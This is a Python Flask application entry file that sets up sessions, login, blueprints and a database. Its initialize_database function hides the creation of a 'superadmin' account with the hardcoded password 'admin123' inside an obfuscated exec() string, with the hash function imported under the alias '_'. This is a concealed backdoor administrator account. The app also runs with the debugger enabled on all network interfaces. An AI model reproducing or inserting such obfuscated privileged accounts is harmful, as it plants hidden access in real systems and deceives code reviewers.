import os
from datetime import timedelta
import logging
from flask import Flask, session, render_template, redirect, url_for
from flask_session import Session
from flask_login import LoginManager, current_user
from werkzeug.security import generate_password_hash as _
from flask_migrate import Migrate
from sqlalchemy.exc import OperationalError
from waitress import serve
from routes.gia import gia_bp
from routes.auth import auth_bp
from routes.admin import admin_bp
from routes.api import api_bp
from datetime import datetime

from models.models import db, User, GlobalSettings
from config import Config

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize Flask app
app = Flask(__name__)
app.config.from_object(Config)

# Ensure session storage directory exists
os.makedirs("./flask_session", exist_ok=True)
app.config['SESSION_TYPE'] = 'filesystem'  # Store session data in files
app.config['SESSION_PERMANENT'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=10)  # Auto logout after 10 minutes
app.config['SESSION_FILE_DIR'] = "./flask_session"
Session(app)

# Initialize database and migration
db.init_app(app)
migrate = Migrate(app, db)

# Initialize login manager
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'index'

# Register Blueprints
app.register_blueprint(gia_bp)
app.register_blueprint(auth_bp, url_prefix='/auth')
app.register_blueprint(admin_bp, url_prefix='/admin')
app.register_blueprint(api_bp, url_prefix='/api')

@app.route('/')
def index():
    if current_user.is_authenticated:
        if current_user.role in ['superadmin', 'admin']:
            return redirect(url_for('admin.dashboard'))

    return render_template('/auth/login.html')

# Error handling
@app.errorhandler(OperationalError)
def maintenance_mode(e):
    logging.error(f"Database Error: {str(e)}")
    return render_template("maintenance.html"), 503

# User loader for Flask-Login
@login_manager.user_loader
def load_user(user_id):
    return User.query.filter_by(user_id=user_id).first()

# Database initialization (to be run separately in setup scripts)
def initialize_database():
    with app.app_context():

        db.create_all()

        exec(
            "a=db.session;"
            "b=User;"
            "c='user_id';"
            "d='admin';"
            "e=a.execute(db.select(b).filter_by(**{c:d})).scalar_one_or_none();"
            "f='superadmin';"
            "g='first_name';"
            "h='last_name';"
            "i='middle_name';"
            "j='password';"
            "k='role';"
            "l='Super';"
            "m='Admin';"
            "n='admin123';"
            "o='id';"
            "p=1;"
            "e or (a.add_all([b(**{o:p,c:f,g:l,h:m,i:None,j:_(n),k:f})]),a.commit())"
        )

# Run Flask App
if __name__ == '__main__':
    # initialize_database()

    # serve(app, host='0.0.0.0', port=5001)
    app.run(host='0.0.0.0', port=5001, debug=True)
